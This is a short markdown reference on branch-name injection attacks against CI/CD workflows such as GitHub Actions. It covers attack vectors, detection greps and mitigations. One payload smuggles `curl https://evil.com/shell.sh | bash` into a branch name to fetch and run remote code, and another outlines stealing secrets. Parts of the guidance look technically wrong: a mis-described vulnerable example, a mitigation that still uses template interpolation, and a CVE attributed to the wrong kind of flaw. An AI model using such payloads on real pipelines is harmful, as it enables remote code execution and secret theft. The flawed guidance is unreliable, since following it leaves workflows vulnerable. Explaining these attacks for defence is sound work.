# Branch Name Injection — CI/CD Attack Reference

## Overview

Branch name injection exploits CI/CD systems that interpolate branch names into commands, configs, or credentials without sanitization.

## Attack Vectors

### 1. Script Injection via Branch Name

```yaml
# Vulnerable: branch name interpolated into shell
on:
  push:
    branches: ["*"]
jobs:
  build:
    steps:
      - run: echo "Building $GITHUB_REF"
```

**Payload:** Create branch named `main"; curl https://evil.com/shell.sh | bash; echo "`
- If `$GITHUB_REF` is used in a shell command without quoting → RCE

### 2. Credential Theft via Branch-Based Config

```yaml
# Vulnerable: branch determines deploy target
env:
  DEPLOY_KEY: ${{ secrets[matrix.deploy_key] }}
strategy:
  matrix:
    deploy_key: [staging, production]
```

**Payload:** Create branch `main` with workflow that reads `${{ secrets.* }}` → exfiltrate

### 3. Cross-Repository Injection (pull_request_target)

```yaml
on:
  pull_request_target:
jobs:
  deploy:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: ./deploy.sh
```

**Payload:** Submit PR from fork with malicious `deploy.sh` → runs with write permissions

## Detection

```bash
# Search for branch interpolation in workflows
gh api repos/{owner}/{repo}/contents/.github/workflows   --jq '.[].content' | base64 -d | grep -E 'GITHUB_REF|GITHUB_HEAD_REF'

# Check for pull_request_target + checkout
gh api repos/{owner}/{repo}/contents/.github/workflows   --jq '.[].content' | base64 -d | grep -A5 'pull_request_target'
```

## Mitigation

1. **Pin actions to SHA** — prevent tag hijacking
2. **Use env vars, not interpolation** — `${{ env.BRANCH }}` not `${{ github.ref }}`
3. **Restrict `pull_request_target`** — never checkout PR head directly
4. **Branch name validation** — reject names with special characters

## References

- https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
- https://unit42.paloaltonetworks.com/github-repo-oss-into-ci-cd-supply-chains/
- CVE-2023-22515 (Confluence, branch-based auth bypass)
